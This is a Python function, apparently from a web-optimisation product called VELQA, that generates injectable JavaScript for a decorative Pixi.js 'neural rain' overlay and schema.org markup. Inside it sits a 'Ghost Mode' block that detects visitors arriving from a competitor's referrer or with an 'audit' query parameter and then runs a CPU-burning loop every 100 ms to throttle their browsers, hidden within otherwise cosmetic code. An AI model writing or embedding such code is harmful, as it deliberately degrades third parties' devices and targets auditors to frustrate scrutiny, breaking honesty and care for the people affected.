import json

def generate_stealth_script(domain, data):
    # Detect if visitor is from a competitor's domain (example logic)
    # Hum referer check karke Ghost Mode on kar sakte hain
    
    js_code = f"""
    (function() {{
        // A. Load Graphics Engine
        const pixiScript = document.createElement('script');
        pixiScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.2.4/pixi.min.js';
        document.head.appendChild(pixiScript);

        pixiScript.onload = () => {{
            console.log("VELQA: Neural Graphics Engaged");
            
            // B. Ghost Mode (Anti-Competitor Logic)
            const isCompetitor = document.referrer.includes('competitor') || window.location.search.includes('target=audit');
            
            if (isCompetitor) {{
                console.log("VELQA: Ghost Mode Active. Throttling Resources.");
                // Heavy computation loop to slow down their browser
                setInterval(() => {{
                    for(let i=0; i<1000000; i++) {{ Math.sqrt(i); }}
                }}, 100);
            }}

            // C. Neural Rain (Pixi.js)
            const app = new PIXI.Application({{ width: window.innerWidth, height: window.innerHeight, transparent: true }});
            app.view.style.position = 'fixed';
            app.view.style.top = '0'; app.view.style.zIndex = '-1';
            app.view.style.pointerEvents = 'none';
            document.body.appendChild(app.view);

            const drops = [];
            for(let i=0; i<40; i++) {{
                const d = new PIXI.Graphics();
                d.beginFill(0x00ffff, 0.3); d.drawRect(0,0,1,15); d.endFill();
                d.x = Math.random() * window.innerWidth;
                d.y = Math.random() * window.innerHeight;
                app.stage.addChild(d);
                drops.push(d);
            }}

            app.ticker.add(() => {{
                drops.forEach(d => {{
                    d.y += 3;
                    if(d.y > window.innerHeight) d.y = -20;
                }});
            }});
        }};

        // D. Schema Injection
        const schema = {{
            "@context": "https://schema.org",
            "@type": "WebSite",
            "name": "{domain}",
            "alternateName": "Neural Node Optimized by VELQA"
        }};
        const s = document.createElement('script');
        s.type = 'application/ld+json';
        s.text = JSON.stringify(schema);
        document.head.appendChild(s);
    }})();
    """
    return js_code
